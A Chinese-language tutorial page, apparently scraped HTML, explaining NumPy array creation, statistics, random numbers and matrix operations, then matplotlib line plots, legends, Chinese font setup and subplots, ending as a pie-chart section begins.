# 指定轴最小值：amin(arr, axis)
np.amin(score)           # 求整个矩阵的最小值
np.amin(score, axis=0)   # 求每一列的最小值(0表示行)
np.amin(score, axis=1)   # 求每一行的最小值(1表示列)

# 指定轴平均值：mean(arr, axis, dtype,)
np.mean(score, dtype=np.int)   # 求整个矩阵的平均值,输出数据类型
np.mean(score, axis=0)   # 求每一列的平均值(0表示行)
np.mean(score, axis=1)   # 求每一行的平均值(1表示列)

# 指定轴方差：std(arr, axis, dtype)
np.std(score)            # 求整个矩阵的方差
np.std(score, axis=0)    # 求每一列的方差(0表示列)
np.std(score, axis=1)    # 求每一行的方差(1表示行)

</textarea><pre>
Numpy.intersect1d(参数 1：数组a;参数 2：数组b)
查找两个数组中的相同元素

Numpy.setdiff1d(参数 1：数组a;参数 2：数组b)
查找在数组a中不在数组b中的元素

Numpy.union1d(参数 1：数组a;参数 2：数组b)
查找两个数组的并集元素

</pre>通常数组的元素最初是未知的,但它的大小是已知的。因此NumPy提供了几个函数来创建具有初始占位符内容的数组。这就减少了数组增长的必要,因为数组增长的操作花费很大<textarea>
Numpy.zeros(shape, dtype)
参数shape表示数组的形状;参数dtype表示数值类型

>>> np.zeros(10, dtype = int)   # array([0, 0, 0, 0, 0, 0, 0, 0, 0, 0])
>>> np.zeros([2,4])             # [[0. 0. 0. 0.], [0. 0. 0. 0.]]
>>> np.zeros((2,4))             # 同上

Numpy.ones(shape, stype)
参数shape表示数组的形状;参数dtype表示数值类型

>>> print(np.ones([2,5]))       # [[1. 1. 1. 1. 1.], [1. 1. 1. 1. 1.]]
>>> np.ones((3,4))*2            # array([[2., 2., 2., 2.], [2., 2., 2., 2.],[2., 2., 2., 2.]])
>>> np.ones((2,3,4), dtype=np.int16)
array([[[1, 1, 1, 1],[1, 1, 1, 1],[1, 1, 1, 1]],[[1, 1, 1, 1],[1, 1, 1, 1],[1, 1, 1, 1]]], dtype=int16)

Numpy.full(shape, value, dtype)
参数shape表示数组的形状; 参数constant value表示数组填充的常数值;参数dtype表示数值类型

>>> np.full((2, 3), 5)         # array([[5, 5, 5], [5, 5, 5]])
>>> np.empty((2,3))            # array([[ 1.,  3., 50.],[ 2.,  4.,  6.]])

</textarea>Numpy np.random创建随机数组: 均匀分布和正态分布<textarea>
>>> np.random.rand()
0.9903129296755788

>>> np.random.rand(2, 4)        # 生成两行四列的[0,1)的随机数
array([[0.22859303, 0.44612153, 0.34272661, 0.91795973],
       [0.2738152 , 0.63453829, 0.75378306, 0.37122076]])

>>> np.random.rand(2, 2, 3)  # 创建指定形状的数组,数值范围在0~1之间
array([[[0.84425057, 0.9316908 , 0.93538169],
        [0.98861855, 0.71806956, 0.04881926]],
       [[0.11556555, 0.08306764, 0.27207263],
        [0.32736287, 0.3529432 , 0.59871304]]])

>>> np.random.randint(1, 10)    # 1-10的随机整数
2
>>> np.random.randint(1, 10, 3) # 生成三个1-10的随机整数
array([4, 5, 2])
>>> np.random.randint(0, 100, size=3)
array([86, 33, 67])

>>> np.random.randint(0, 10, size=[2,2])  # 生成[0,10)的2行2列的随机整数
array([[9, 5], [7, 1]])

>>> np.random.randn()
-0.423085439829167
>>> np.random.randn()
0.18120120005698093
>>> np.random.randn(2, 4)  # 生成均值为0方差为1的2行4列的正态分布值
array([[-0.48337422,  1.69319444, -0.22802549,  0.80345571],
       [-0.63192176,  0.32885759, -0.13304253,  0.70744369]])

>>> np.random.random()                 # 生成一个[0,1)的随机数
0.13667987505031765
>>> np.random.random(size=[2,2])       # 生成[0,1)的2行2列的随机数
array([[0.59390284, 0.03744734], [0.94391978, 0.10537831]])

>>> np.random.choice([2, 4, 6])                           # 从给定的列表等概率抽样1次
2
>>> np.random.choice(['a', 'e', 'i', 'o', 'u'], size=10)  # 从给定的列表等概率抽样10次
array(['i', 'o', 'a', 'i', 'a', 'u', 'i', 'e', 'o', 'a'], dtype='< U1')
>>> np.random.choice(['a', 'e', 'i', 'o', 'u'], size=10, p=[0.3, .1, 0.1, 0.4, 0.1]) # 从给定的列表和对应的概率分布抽样10次
array(['a', 'o', 'o', 'e', 'a', 'o', 'i', 'a', 'o', 'o'], dtype='< U1')

np.random.beta(1, 10, 100)      # 100个1-10的数

</textarea><pre>
通过numpy生成序列数sequences
Numpy.arange()和Numpy.linspace()函数也可以均匀分布
Numpy.arange(start, stop, step)
创建一个秩为1的array,其中包含位于半开区间[start, stop)内并均匀分布的值,start默认为0,step表示两个相邻值之间的差。

</pre>np.arange()<pre>
>>> np.arange(11)                           # array([ 0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10])
>>> np.arange(1, 11)                        # 生成一个1-10的等差数列,array([ 1,  2,  3,  4,  5,  6,  7,  8,  9, 10])
>>> np.arange( 10, 30, 5 )                  # array([10, 15, 20, 25])
>>> np.arange(10, 0, -1)                    # 降序,array([10,  9,  8,  7,  6,  5,  4,  3,  2,  1])
>>> np.arange( 0, 2, 0.3 )                  # array([ 0. ,  0.3,  0.6,  0.9,  1.2,  1.5,  1.8])
>>> np.arange(1, 11).reshape([2,5])         # 5改成-1等效,array([[ 1,  2,  3,  4,  5], [ 6,  7,  8,  9, 10]])
>>> np.arange(1, 11).reshape([2,5]).ravel() # 展开数组,array([ 1,  2,  3,  4,  5,  6,  7,  8,  9, 10])
>>> np.arange(1, 5, 2, dtype=np.int)        # array([1, 3])

</pre><pre>
Numpy.linspace(start, stop, num)
创建num个在闭区间[start, stop]内均匀分布的值,使用np.linspace自动计算数组的递增值,递增值可能并不相等,原因是计算递增值采用了四舍五入的算法rounding
np.linspace(1, 5, 3)  # array([1., 3., 5.])
np.linspace(start=1, stop=50, num=10, dtype=int)  # array([ 1, 6, 11, 17, 22, 28, 33, 39, 44, 50])

np.logspace()
与np.linspace类似,np.logspace以对数尺度的方式增长

</pre><textarea>
# 设置数组的精度为小数点后两位
np.set_printoptions(precision=2)
# 起点为10^1,终点为10^50,数组元素个数10,以10为底数
np.logspace(start=1, stop=50, num=10, base=10)
#> array([ 1.00e+01, 2.78e+06, 7.74e+11, 2.15e+17, 5.99e+22,
#> 1.67e+28, 4.64e+33, 1.29e+39, 3.59e+44, 1.00e+50])

</textarea><pre>
正态分布
Numpy.random.normal(loc, scale, size)
创建给定均值、标准差、维度的正态分布

</pre><pre>
>>> np.random.normal(loc=1.75, scale=0.1, size=[4, 5]) # 正态生成4行5列的二位数组
array([[1.93836782, 1.90301121, 1.69151292, 1.66674492, 1.71987825],
       [1.7469837 , 1.47657585, 1.62083324, 1.84838067, 1.67962612],
       [1.75511665, 1.60830436, 1.70786068, 1.64993127, 1.79697416],
       [1.71582758, 1.55085695, 1.82286489, 1.77978783, 1.65036107]])

</pre><pre>
通过numpy生成重复数repetitions
np.tile(arr, n)
np.repeat(arr, 2)
构建重复的序列数,重复整个的数组或列表n次,np.repeat重复数组每一项n次。

a = [1,2,3]
print(np.tile(a, 2))      # 重复数组a两次,[1 2 3 1 2 3]
print(np.repeat(a, 2))    # 重复数组a每项两次,[1 1 2 2 3 3]

</pre><pre>
【 矩阵 】
NumPy的主要对象是同种元素的多维数组。这是一个所有的元素都是一种类型、通过一个正整数元组索引的元素表格,通常是元素是数字

在NumPy中维度(dimensions)叫做轴axes,轴的个数叫做秩rank,但和线性代数中的秩不是一样的
在用python求线代中的秩中,numpy包中的linalg.matrix_rank方法计算矩阵的秩
线性代数中秩的定义：设在矩阵A中有一个不等于0的r阶子式D,且所有r+1阶子式(如果存在的话)全等于0,那末D称为矩阵A的最高阶非零子式,数r称为矩阵A的秩,记作R(A)。

numpy中数组和矩阵的区别：
matrix是array的分支,matrix和array在很多时候都是通用的,用哪一个都一样。但官方建议如果两个可以通用就选择array,因为array更灵活,速度更快,很多人把二维的array也翻译成矩阵。
但matrix的优势就是相对简单的运算符号,比如两个矩阵相乘就是用符号*,但是array相乘不能这么用,得用方法.dot()
array的优势就是不仅仅表示二维,还能表示3、4、5等维,而且在大部分Python程序里array也是更常用的

</pre><textarea>
A = np.matrix('1.0 2.0; 3.0 4.0')
A       # matrix([[1., 2.],[3., 4.]])
type(A) # < class 'numpy.matrix'>,file where class is defined
A.T     # matrix([[1., 3.],[2., 4.]]), transpose

X = np.matrix('5.0 7.0')
X        # matrix([[5., 7.]])
Y = X.T
Y        # matrix([[5.],[7.]])

A*Y      # matrix([[19.],[43.]]),matrix multiplication
A.I      # matrix([[-2. ,  1. ],[ 1.5, -0.5]]),inverse

</textarea>矩阵运算(一种特殊的二维数组)<textarea>
# 创建单位矩阵
>>> np.eye(5)
array([[1., 0., 0., 0., 0.],
       [0., 1., 0., 0., 0.],
       [0., 0., 1., 0., 0.],
       [0., 0., 0., 1., 0.],
       [0., 0., 0., 0., 1.]])

# 创建对角矩阵
>>> np.diag([10, 20, 30, 40])
array([[10,  0,  0,  0],
       [ 0, 20,  0,  0],
       [ 0,  0, 30,  0],
       [ 0,  0,  0, 40]])

x=np.arange(9).reshape(3,3)
x              # array([[0, 1, 2], [3, 4, 5], [6, 7, 8]])
np.dot(x,x)    # 矩阵相乘, array([[ 15,  18,  21], [ 42,  54,  66], [ 69,  90, 111]])
x.T            # 矩阵转置, array([[0, 3, 6], [1, 4, 7], [2, 5, 8]])
x.transpose()  # 矩阵转置, array([[0, 3, 6], [1, 4, 7], [2, 5, 8]])

### 矩阵计算规则:(M行,N列)*(N行,Z列)=(M行,Z列)
# 平时成绩占40% 期末成绩占60%, 计算结果
st_score = np.array([[80, 88], [82, 81], [84, 75], [86, 83], [75, 81]])
q = np.array([[0.4], [0.6]])
np.dot(st_score, q)   # array([[84.8], [81.4], [78.6], [84.2], [78.6]])

### 矩阵垂直拼接(前提两个两个矩阵列数相同,行数随意)：vstack(tuple)
v1 = [[0, 1, 2, 3, 4, 5], [6, 7, 8, 9, 10, 11]]
v2 = [[12, 13, 14, 15, 16, 17],[18, 19, 20, 21, 22, 23],[18, 19, 20, 21, 22, 23]]
np.vstack((v1, v2))
# array([[ 0,  1,  2,  3,  4,  5],
       [ 6,  7,  8,  9, 10, 11],
       [12, 13, 14, 15, 16, 17],
       [18, 19, 20, 21, 22, 23],
       [18, 19, 20, 21, 22, 23]])

### 矩阵水平拼接(前提两个两个矩阵行数相同,列数随意)：hstack(tuple)
v1 = [[0, 1, 2, 3, 4, 5], [6, 7, 8, 9, 10, 11]]
v2 = [[12, 13, 14, 15, 16, 17], [18, 19, 20, 21, 22, 23]]
np.hstack((v1, v2))
array([[ 0,  1,  2,  3,  4,  5, 12, 13, 14, 15, 16, 17],
       [ 6,  7,  8,  9, 10, 11, 18, 19, 20, 21, 22, 23]])

### 矩阵删除：Numpy.delete(arr, elements删除的对象, axis)
OriginalY = np.array([[1, 2, 3], [4, 5, 6], [7, 8, 9]])
np.delete(OriginalY, [0, 2])         # array([2, 4, 5, 6, 7, 8, 9])
np.delete(OriginalY, [0, 2], axis=0) # array([[4 5 6]])
np.delete(OriginalY, [0, 2], axis=1) # array([[2] [5] [8]])

### 矩阵添加：Numpy.append(arr, elements添加元素, axis)
OriginalY = np.array([[1, 2, 3],[4, 5, 6],[7, 8, 9]])
np.append(OriginalY, [0, 2])                    # 末尾添加元素,array([1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 2])
np.append(OriginalY, [[0, 2, 11]], axis=0)      # 最后一行添加一行,array([[ 1,  2,  3],[ 4,  5,  6],[ 7,  8,  9],[ 0,  2, 11]])
np.append(OriginalY, [[0], [2], [11]], axis=1)  # 最后一列添加一列,array([[ 1,  2,  3,  0],[ 4,  5,  6,  2],[ 7,  8,  9, 11]])

### 矩阵插入：Numpy.insert(arr, index插入位置索引, elements添加元素, axis)
OriginalY = np.array([[1, 2, 3],[4, 5, 6],[7, 8, 9]])
print(np.insert(OriginalY, 1, [11, 12, 10]))
print(np.insert(OriginalY, 1, [[11, 12, 10]], axis=0))
print(np.insert(OriginalY, 1, [[11, 12, 10]], axis=1))  # 在列索引1的位置插入

</textarea><pre>
【 文件加载 】
np.loadtxt(fname,dtype,comments='#',delimiter=None,skiprows=0,usecols=None)
fname:读取的文件、文件名
dtype：数据类型
comments：注释
delimiter：分隔符,默认是空格
skiprows：跳过前几行读取,默认是0
usecols：读取哪些列,usecols=(1, 2, 5)读取第1,2,5列,默认所有列

</pre>numpy数据的读取和保存<textarea>
np.save('name',data)

np.load('name.npy')
# array([[-0.03148106, -0.97819034, -1.85828013, -0.33782379],
       [-0.02822319, -0.83957549, -0.33771694, -0.08184963],
       [ 1.58669867, -0.31934723,  0.51126626,  0.80444954],
       [ 1.68160714,  1.57692769,  0.70764701,  1.17201164]])

</textarea>
</div>

<div id="scipy">
<h4>数据分析之scipy</h4><pre>
scipy:强大的科学计算方法(矩阵分析、信号分析、数理分析...)

</pre>
</div>

<div id="matplotlib">
<h4>数据分析之matplotlib 数据可视化</h4><pre>
matplotlib是Python的2D绘图库,可通过这个库将数据绘制成各种2D图形如折线图、直方图、散点图、条形图等,可支持硬拷贝和跨系统的交互,可以在Python脚本、IPython的交互环境下、Web应用程序中使用。该项目是由John Hunter于2002年启动的,其目的是为Python构建一个MATLAB式的绘图接口。如果结合使用一种GUI工具包(如IPython),Matplotlib还具有诸如缩放和平移等交互功能。它不仅支持各种操作系统上许多不同的GUI后端,而且还能将图片导出为各种常见的矢量(vector)和光栅(raster)图：PDF、SVG、JPG、PNG、BMP、GIF等
虽然Pandas中也有一些绘图操作,但Matplotlib在绘图显示效果方面更加出色

matplotlib是面向对象的绘图工具包,绘制的图形中的每一个元素都是一个对象,可以修改这些对象的属性,从而改变图样式。

win10子系统ubuntu matplotlib中plt.show()不显示图,须使用ubuntu虚拟机
使用%pylab查看matplotlib后端发现是agg,agg是不会画图的
In [4]:%pylab
Using matplotlib backend: agg
Populating the interactive namespace from numpy and matplotlib

解决
1. 安装Tkinter 和 matplotlib
问题在于python居然没有Tkinter
sudo apt-get install tk-dev
pip uninstall -y matplotlib
pip --no-cache-dir install -U matplotlib #这是最关键的

2. 设置agg
其实经过上面的步骤, 已经可以画图了
补充2种设置agg方法

临时的
import matplotlib
matplotlib.use('TkAgg')
这个命令必须在第一次使用%pylab 或者import matplotlib.pyplot as plt之前使用
常见的agg有：Qt4Agg Qt5Agg TkAgg WX WXAgg Agg Cairo GDK PS PDF SVG

永久的
修改matplotlibrc文件
matplotlibrc文件的位置在：
[~/.virtualenvs/myenv]/lib/python2.7/site-packages/matplotlib/mpl-data/
修改位置：
backend : youragg
至此,matplotlib可以正常工作了。

matplotlib中主要绘图对象列表如下：
Figure对象可以想象为一张画布
Axes对象字面理解为坐标轴也可以认为是子图,在一个Figure对象中可以包含多个Axes对象,也就是说一张画布可以包含多个子图
Line2D对象代表线条
Text对象代表了文字

plt.figure()的使用
figure(num=None, figsize=None, dpi=None, facecolor=None, edgecolor=None, frameon=True)
新建一个画布,如果有多个图依次可视化的时候需要使用,否则所有的图都显示在同一个画布中
num:图像编号或名称,数字为编号,字符串为名称,即matplotlib窗口标题
figsize:指定figure的宽和高,单位为英寸inch;
dpi:指定绘图对象的分辨率,即每英寸多少个像素,缺省值为80,1英寸等于2.5cm,A4纸是 21*30cm的纸张 
facecolor:背景颜色
edgecolor:边框颜色
frameon:是否显示边框

</pre><textarea>
import matplotlib.pyplot as plt
# 创建自定义图像
fig=plt.figure(figsize=(4,3),facecolor='blue')
plt.show()

</textarea>同时打开多个matplotlib图<textarea>
import numpy as np
import matplotlib.pyplot as plt

# figure的使用
x = np.linspace(-1, 1, 50)
y1 = 2 * x + 1

# figure 1
plt.figure()
plt.plot(x, y1)

# figure 2
y2 = x**2
plt.figure()
plt.plot(x, y2)

# figure 3,指定figure的编号并指定figure的大小, 指定线的颜色, 宽度和类型
y2 = x**2
plt.figure(num = 5, figsize = (4, 4))
plt.plot(x, y1)
plt.plot(x, y2, color = 'red', linewidth = 1.0, linestyle = '--')
plt.show()

</textarea><pre>
先导入模块pyplot,然后使用该模块的plot函数来绘制折线图,接着调用该模块的相关函数来调整、设置图表的标题、横纵标签、刻度标记内容或大小,plot函数可以接收输入参数和输出参数,还有线条粗细等参数,但若plot函数只指定输出参数(列表),那么输入参数默认由0开始

</pre>简单的折线图<textarea>
import matplotlib.pyplot as plt             # pyplot模块的plot函数可以接收输入参数和输出参数,还有线条粗细等参数
squares = [1, 4, 9, 16, 25]                 # 指定输出参数(1,2,3,4,5的平方数列表),采用默认输入参数处理X轴变成[0,1,2,3,4]
plt.plot(squares, linewidth=5)              # 这里只指定了一个列表,那么就当作是输出参数,输入参数从0开始,就会发现没有正确绘制数据
plt.title("Square Numbers", fontsize=24)    # 指定标题,并设置标题字体大小
plt.xlabel("Value", fontsize=14)            # 指定X坐标轴的标签,并设置标签字体大小
plt.ylabel("Square of Value", fontsize=14)  # 指定Y坐标轴的标签,并设置标签字体大小
plt.tick_params(axis='both', labelsize=14)  # 参数axis值为both代表要设置横纵的刻度标记,标记大小为14
#plt.show()                                  # 打开matplotlib查看器,并显示绘制的图形
plt.savefig('./plt.png')

</textarea>plot函数指定输入参数和输出参数,输入和输出参数中元素个数必须相同<textarea>
import matplotlib.pyplot as plt
input_values = [1, 2, 3, 4, 5]                # 指定输入参数
squares = [1, 4, 9, 16, 25]                   # 指定输出参数
plt.plot(input_values, squares, linewidth=5)  # 调用绘制函数,传入输入参数和输出参数
plt.title("Square Numbers", fontsize=24)      # 指定标题,并设置标题字体大小
plt.xlabel("Value", fontsize=14)              # 指定X坐标轴的标签,并设置标签字体大小
plt.ylabel("Square of Value", fontsize=14)    # 指定Y坐标轴的标签,并设置标签字体大小
plt.tick_params(axis='both', labelsize=14)    # 参数axis值为both,代表要设置横纵的刻度标记,标记大小为14
plt.savefig('./plt.png')

</textarea><textarea>
import matplotlib.pyplot as plt
# 定义2个列表分别作为X轴、Y轴数据
x_data = ['2013', '2014', '2015', '2016', '2017', '2018', '2019']
y_data = [58000, 60200, 63000, 71000, 84000, 90500, 107000]
# 第一个列表代表横坐标的值,第二个代表纵坐标的值
plt.plot(x_data, y_data)
# 调用show()函数显示图形
plt.show()

</textarea>plot()除了支持创建具有单条折线的折线图,也支持创建包含多条折线的复式折线图,只要在调用plot()时传入多个分别代表X轴和Y轴数据的list列表即可,也可以通过多次调用plot()函数来生成多条折线<textarea>
import matplotlib.pyplot as plt
x_data = ['2013', '2014', '2015', '2016', '2017', '2018', '2019']
# 定义2个列表分别作为两条折线的Y轴数据
y_data = [58000, 60200, 63000, 71000, 84000, 90500, 107000]
y_data2 = [52000, 54200, 51500,58300, 56800, 59500, 62700]
# 传入2组分别代表X轴、Y轴的数据
plt.plot(x_data, y_data, x_data, y_data2)
# 调用show()函数显示图形
plt.show()

</textarea><pre>
在调用plot()函数时还可以传入额外的参数来指定折线的样子,如线宽、颜色、样式等
linestyle指定折线样式时,该参数支持如下字符串参数值：
-：代表实线,这是默认值。
--：代表虚线。
·：代表点钱。
-.：代表短线、点相间的虚钱。

</pre><textarea>
import matplotlib.pyplot as plt
x_data = ['2011', '2012', '2013', '2014', '2015', '2016', '2017']
# 定义2个列表分别作为两条折线的Y轴数据
y_data = [58000, 60200, 63000, 71000, 84000, 90500, 107000]
y_data2 = [52000, 54200, 51500,58300, 56800, 59500, 62700]
# 指定折线的颜色、线宽和样式
plt.plot(x_data, y_data, color = 'red', linewidth = 2.0, linestyle = '--')
plt.plot(x_data, y_data2, color = 'blue', linewidth = 3.0, linestyle = '-.')
# 调用show()函数显示图形
plt.show()

</textarea><pre>
Matplotlib legend函数：为每条折线添加图例
legend()可传入两个list参数,其中第一个list参数(handles参数)用于引用折线图上的每条折线;第二个list参数(labels)代表为每条折线所添加的图例

程序在调用plot()函数绘制折线图时,获取了该函数的返回值,由于该函数的返回值是一个列表,而此处只需要获取它返回的列表的第一个元素代表该函数所绘制的折线图,因此程序利用返回值的序列解包来获取

loc参数指定图例的添加位置,该参数支持如下参数值：
'best'(0)：自动选择最佳位置。
'upper right'(1)：将图例放在右上角。
'upper left'(2)：将图例放在左上角。
'lower left'(3)：将图例放在左下角。
'lower right'(4)：将图例放在右下角。
'right'(5)：将图例放在右边。
'center left'(6)：将图例放在左边居中的位置。
'center right'(7)：将图例放在右边居中的位置。
'lower center'(8)：将图例放在底部居中的位置。
'upper center'(9)：将图例放在顶部居中的位置。
'center'(10)：将图例放在中心。

plt.legend()
plt.legend(loc=0) # 显示图例的位置,自适应方式

</pre><textarea>
import matplotlib.pyplot as plt
x_data = ['2011', '2012', '2013', '2014', '2015', '2016', '2017']
# 定义2个列表分别作为两条折线的Y轴数据
y_data = [58000, 60200, 63000, 71000, 84000, 90500, 107000]
y_data2 = [52000, 54200, 51500,58300, 56800, 59500, 62700]
# 指定折线的颜色、线宽和样式
ln1, = plt.plot(x_data, y_data, color = 'red', linewidth = 2.0, linestyle = '--')
ln2, = plt.plot(x_data, y_data2, color = 'blue', linewidth = 3.0, linestyle = '-.')
# 调用legend函数设置图例
plt.legend(handles=[ln2, ln1], labels=['Android基础', 'Java基础'], loc='lower right')
# 调用show()函数显示图形
plt.show()

</textarea><pre>
Matplotlib默认不支持中文字体,在程序中修改Matplotlib的默认字体则可按如下步骤进行：
使用matplotlib.font_manager子模块下的FontProperties类加载中文字体。
在调用legend()函数时通过prop属性指定使用中文字体。

每次绘制中文内容时都需要设置字体,那么是否能改变Matplotlib的默认字体呢？在Python的交互式解释器中输入如下两行命令：
>>> import matplotlib
>>> matplotlib.matplotlib_fname() # 显示Matplotlib配置文件的保存位置
'D:\\Python\\Python36\\lib\\site-packages\\matplotlib\\mp1-data\\matplotlibrc'
打开Matplotlib配置文件找到如下这行代码：
#font.family：sans-serif
修改为
font.family： Microsoft YaHei

</pre><textarea>
import matplotlib.font_manager as fm
my_font=fm.FontProperties(fname="C:\Windows\Fonts\simkai.ttf") # 使用Matplotlib的字体管理器加载中文字体
plt.legend(handles=[ln2, ln1], labels=['Android基础', 'Java基础'], loc='lower right', prop=my_font)

# 使用legend()时可以不指定handles参数,只传入labels参数,这样该labels参数将按顺序为折线图中的多条折线添加图例
plt.legend(labels=['Java基础', 'Android基础'], loc='lower right', prop=my_font)

# Matplotlib也允许在调用plot()函数时为每条折线分别传入label参数,这样程序在调用legend()函数时就无须传入labels、handles参数了
import matplotlib.pyplot as plt
x_data = ['2013', '2014', '2015', '2016', '2017', '2018', '2019']
# 定义2个列表分别作为两条折线的Y轴数据
y_data = [58000, 60200, 63000, 71000, 84000, 90500, 107000]
y_data2 = [52000, 54200, 51500,58300, 56800, 59500, 62700]
# 指定折线的颜色、线宽和样式
plt.plot(x_data, y_data, color = 'red', linewidth = 2.0, linestyle = '--', label='Java基础')
plt.plot(x_data, y_data2, color = 'blue', linewidth = 3.0, linestyle = '-.', label='Android基础')
import matplotlib.font_manager as fm
my_font=fm.FontProperties(fname="C:\Windows\Fonts\simkai.ttf")  # 使用Matplotlib的字体管理器加载中文字体
plt.legend(loc='best')                                          # 调用legend函数设置图例
plt.show()                                                      # 调用show()函数显示图形

</textarea>调用xlable()和ylabel()函数分别设置X轴、Y轴的名称,也可以通过title()函数设置整个数据图的标题,还可以调用xticks()、yticks()函数分别改变X轴、Y轴的刻度值,允许使用文本作为刻度值<textarea>
import matplotlib.pyplot as plt
x_data = ['2011', '2012', '2013', '2014', '2015', '2016', '2017']
# 定义2个列表分别作为两条折线的Y轴数据
y_data = [58000, 60200, 63000, 71000, 84000, 90500, 107000]
y_data2 = [52000, 54200, 51500,58300, 56800, 59500, 62700]
# 指定折线的颜色、线宽和样式
plt.plot(x_data, y_data, color = 'red', linewidth = 2.0, linestyle = '--', label='Java')
plt.plot(x_data, y_data2, color = 'blue', linewidth = 3.0, linestyle = '-.', label='C')
plt.legend(loc='best')           # 调用legend函数设置图例
plt.xlabel("years")              # 设置两条坐标轴的名字
plt.ylabel("sales")
plt.title('sales for years')     # 设置数据图的标题
plt.yticks([50000, 70000, 100000], [r'ok', r'good', r'perfect']) # 设置Y轴上的刻度值,第一个参数是点的位置,第二个参数是点的文字提示
plt.show()

</textarea>可调用gca()函数来获取坐标轴信息对象AxesSubplot,然后对坐标轴进行更细致的控制,比如控制坐标轴上刻度值的位置和坐标轴的位置等,通过AxesSubplot对象的spines属性可以访问数据图四周的坐标轴线(Spine对象),通过Spine对象可设置坐标轴线的颜色、位置等<textarea>
import matplotlib.pyplot as plt
x_data = ['2011', '2012', '2013', '2014', '2015', '2016', '2017']
y_data = [58000, 60200, 63000, 71000, 84000, 90500, 107000]
y_data2 = [52000, 54200, 51500,58300, 56800, 59500, 62700]
plt.plot(x_data, y_data, color = 'red', linewidth = 2.0, linestyle = '--', label='Java')
plt.plot(x_data, y_data2, color = 'blue', linewidth = 3.0, linestyle = '-.', label='C')
plt.legend(loc='best')       # 调用legend函数设置图例
plt.xlabel("years")          # 设置两条坐标轴的名字
plt.ylabel("sales")
plt.title('sales for years') # 设置数据图的标题
plt.yticks([50000, 70000, 100000], [r'ok', r'good', r'perfect']) # 设置Y轴上的刻度值,第一个参数是点的位置,第二个参数是点的文字提示
ax = plt.gca()
ax.xaxis.set_ticks_position('bottom') # 设置将X轴的刻度值放在底部X轴上
ax.yaxis.set_ticks_position('left')   # 设置将Y轴的刻度值放在底部X轴上
ax.spines['right'].set_color('none')  # 设置右边坐标轴线的颜色(设置为none表示不显示)
ax.spines['top'].set_color('none')    # 设置顶部坐标轴线的颜色(设置为none表示不显示)
ax.spines['bottom'].set_position(('data', 70000)) # 定义底部坐标轴线的位置(坐标原点放在70000数值处)
plt.show()

</textarea><pre>
Matplotlib subplot函数创建单个子图
使用Matplotlib除可以生成包含多条折线的复式折线图之外,它还允许在一张数据图上包含多个子图。
调用subplot()函数可以创建一个子图,然后程序就可以在子图区域上进行绘制。

subplot(nrows, ncols, index, **kwargs)
nrows参数指定将数据图区域分成多少行;ncols参数指定将数据图区域分成多少列;index参数指定获取第几个区域。
也支持直接传入一个三位数的参数,其中第一位数将作为nrows参数;第二位数将作为ncols参数;第三位数将作为index参数。

</pre><textarea>
import matplotlib.pyplot as plt
import numpy as np
plt.figure()
x_data = np.linspace(-np.pi, np.pi, 64, endpoint=True)  # 定义从-pi到pi之间的数据,平均取64个数据点

# 将整个figure分成两行两列,第三个参数表示该图形放在第1个网格,绘制正弦曲线
plt.subplot(2, 2, 1)
plt.plot(x_data, np.sin(x_data))
plt.gca().spines['right'].set_color('none')
plt.gca().spines['top'].set_color('none')
plt.gca().spines['bottom'].set_position(('data', 0))
plt.gca().spines['left'].set_position(('data', 0))
plt.title('正弦曲线')

# 将整个figure分成两行两列,并将该图形放在第2个网格,绘制余弦曲线
plt.subplot(222)
plt.plot(x_data, np.cos(x_data))
plt.gca().spines['right'].set_color('none')
plt.gca().spines['top'].set_color('none')
plt.gca().spines['bottom'].set_position(('data', 0))
plt.gca().spines['left'].set_position(('data', 0))
plt.title('余弦曲线')

# 将整个figure分成两行两列,并该图形放在第3个网格,绘制正切曲线
plt.subplot(223)
plt.plot(x_data, np.tan(x_data))
plt.gca().spines['right'].set_color('none')
plt.gca().spines['top'].set_color('none')
plt.gca().spines['bottom'].set_position(('data', 0))
plt.gca().spines['left'].set_position(('data', 0))
plt.title('正切曲线')

plt.show()

</textarea>让某个子图占多个网格<textarea>
import matplotlib.pyplot as plt
import numpy as np
plt.figure()
x_data = np.linspace(-np.pi, np.pi, 64, endpoint=True)
plt.subplot(2, 1, 1)
# 省略绘制正弦曲线
...
# 将整个figure分成两行两列,并将该图形放在第4个网格
plt.subplot(223)
# 省略绘制余弦曲线
...
# 将整个figure分成两行两列,并该图形放在第4个网格
plt.subplot(224)
#省略绘制正切曲线
...
plt.show()

</textarea><textarea>
import matplotlib.pyplot as plt
import numpy as np
import matplotlib.gridspec as gridspec
plt.figure()
x_data = np.linspace(-np.pi, np.pi, 64, endpoint=True)

gs = gridspec.GridSpec(2, 3)  # 将绘图区域分成2行3列
ax1 = plt.subplot(gs[0, :])   # 指定ax1占用第一行(0)整行
ax2 = plt.subplot(gs[1, 0])   # 指定ax2占用第二行(1)的第一格(第二个参数0代表)
ax3 = plt.subplot(gs[1, 1:3]) # 指定ax3占用第二行(1)的第二、三格(第二个参数0代表)

# 绘制正弦曲线
ax1.plot(x_data, np.sin(x_data))
ax1.spines['right'].set_color('none')
ax1.spines['top'].set_color('none')
ax1.spines['top'].set_color('none')
ax1.spines['bottom'].set_position(('data', 0))
ax1.spines['left'].set_position(('data', 0))
ax1.set_title('正弦曲线')
# 绘制余弦曲线
ax2.plot(x_data, np.cos(x_data))
ax2.spines['right'].set_color('none')
ax2.spines['top'].set_color('none')
ax2.spines['bottom'].set_position(('data', 0))
ax2.spines['left'].set_position(('data', 0))
ax2.set_title('余弦曲线')
# 绘制正切曲线
ax3.plot(x_data, np.tan(x_data))
ax3.spines['right'].set_color('none')
ax3.spines['top'].set_color('none')
ax3.spines['bottom'].set_position(('data', 0))
ax3.spines['left'].set_position(('data', 0))
ax3.set_title('正切曲线')
plt.show()

</textarea><pre>
subplots创建多个子图
fig, axes = plt.subplots(2, 1, sharex=True,figsize=(10,10))
axes[0].plot(range (len(data20)),data20,'r')
axes[1].plot(range (len(data40)),data40,'b')

</pre><textarea>
import numpy as np
import matplotlib.pyplot as plt

x = np.arange(0, 100)
#划分子图
fig,axes=plt.subplots(2,2)
ax1=axes[0,0]
ax2=axes[0,1]
ax3=axes[1,0]
ax4=axes[1,1]

#作图1
ax1.plot(x, x)
#作图2
ax2.plot(x, -x)
#作图3
ax3.plot(x, x ** 2)
ax3.grid(color='r', linestyle='--', linewidth=1,alpha=0.3)
#作图4
ax4.plot(x, np.log(x))
plt.show()

</textarea><pre>
【 pie函数绘制饼状图 】

</pre><textarea>
import matplotlib.pyplot as plt
